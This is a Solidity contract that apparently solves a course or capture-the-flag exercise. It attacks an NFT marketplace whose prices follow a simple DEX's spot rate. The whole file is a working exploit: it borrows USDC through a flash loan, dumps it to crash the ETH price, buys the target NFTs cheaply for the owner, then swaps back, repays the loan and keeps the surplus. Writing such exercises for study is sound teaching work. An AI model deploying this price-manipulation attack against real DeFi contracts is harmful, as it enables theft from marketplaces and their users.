// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFELStudentNFT {
    function transferFrom(address from, address to, uint256 tokenId) external;
}

interface ISimpleDEX {
    function getCurrentUsdcToEthPrice() external view returns (uint);
    function getCurrentEthToUsdcPrice() external view returns (uint);
    function usdcToEth(uint usdcAmount) external returns (uint ethBought);
    function ethToUsdc() external payable returns (uint usdcBought);
}

interface INFTMarketplace {
    function buyNFT(uint256 tokenId) external payable;
    function getCurrentPriceForNFT(uint256 tokenId) external view returns (uint256);
}

contract FlashLoanNFTAttacker is IERC3156FlashBorrower {
    // Custom errors
    error OnlyOwnerAllowed();
    error NoEthProvided();
    error UntrustedLender();
    error UnauthorizedInitiator();
    error UnsupportedToken();
    error EthTransferFailed();

    /// USDCbalance: `USDCbalance`, USDCrequired: `USDCrequired`
    error RepaymentFailed(uint256 USDCbalance, uint256 USDCrequired);

    // Contracts we interact with
    IERC3156FlashLender public immutable lender;
    IERC20 public immutable usdcToken;
    ISimpleDEX public immutable dex;
    INFTMarketplace public immutable marketplace;
    IFELStudentNFT public immutable nftContract;
    
    // Owner (attacker)
    address public owner;
    
    // NFT IDs to purchase
    uint256[] public targetNftIds;
    
    // Constructor to set up the attack contract
    constructor(
        address _lender,
        address _usdcToken,
        address _dex,
        address _marketplace,
        address _nftContract
    ) {
        lender = IERC3156FlashLender(_lender);
        usdcToken = IERC20(_usdcToken);
        dex = ISimpleDEX(_dex);
        marketplace = INFTMarketplace(_marketplace);
        nftContract = IFELStudentNFT(_nftContract);
        owner = msg.sender;
    }
    
    // Sets up NFT targets to purchase during the attack
    function setTargets(uint256[] calldata _nftIds) external {
        if (msg.sender != owner) revert OnlyOwnerAllowed();
        delete targetNftIds;
        
        for (uint i = 0; i < _nftIds.length; i++) {
            targetNftIds.push(_nftIds[i]);
        }
    }
    
    // Executes the flash loan attack
    function executeAttack(uint256 loanAmount) external payable {
        if (msg.sender != owner) revert OnlyOwnerAllowed();
        
        // Initiate the flash loan
        bytes memory data = abi.encode(targetNftIds);
        lender.flashLoan(this, address(usdcToken), loanAmount, data);
        
        // Transfer any remaining ETH back to the owner
        (bool success, ) = owner.call{value: address(this).balance}("");
        if (!success) revert EthTransferFailed();
    }
    
    // Flash loan callback function where the actual attack happens
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        // Ensure this is called by the lending contract
        if (msg.sender != address(lender)) revert UntrustedLender();
        if (initiator != address(this)) revert UnauthorizedInitiator();
        if (token != address(usdcToken)) revert UnsupportedToken();
        
        // Decode the NFT ids to buy
        uint256[] memory nftIds = abi.decode(data, (uint256[]));
        
        // Approve DEX to spend our USDC
        usdcToken.approve(address(dex), amount);
        
        // Dump all USDC to manipulate the price
        dex.usdcToEth(amount);
        
        // Buy all target NFTs at the reduced ETH price and transfer to owner
        for (uint i = 0; i < nftIds.length; i++) {
            uint256 ethPrice = marketplace.getCurrentPriceForNFT(nftIds[i]);
            marketplace.buyNFT{value: ethPrice}(nftIds[i]);
            
            // Transfer the NFT to the owner
            nftContract.transferFrom(address(this), owner, nftIds[i]);
        }
        
        // Convert ETH back to USDC to repay the loan
        uint256 usdcToRepay = amount + fee;
        uint256 usdcBought = dex.ethToUsdc{value: address(this).balance}();
        
        // Check if we have enough USDC to repay
        uint256 currentUsdcBalance = usdcToken.balanceOf(address(this));
        if (currentUsdcBalance < usdcToRepay) {
            revert RepaymentFailed(currentUsdcBalance, usdcToRepay);
        }
        
        // Transfer the tokens to the lender to repay the loan
        usdcToken.transfer(address(lender), usdcToRepay);

        // Transfer any remaining USDC back to the player
        usdcToken.transfer(owner, usdcBought - usdcToRepay);
        
        // Return the required value to indicate successful flash loan execution
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    // Function to receive ETH
    receive() external payable {}
}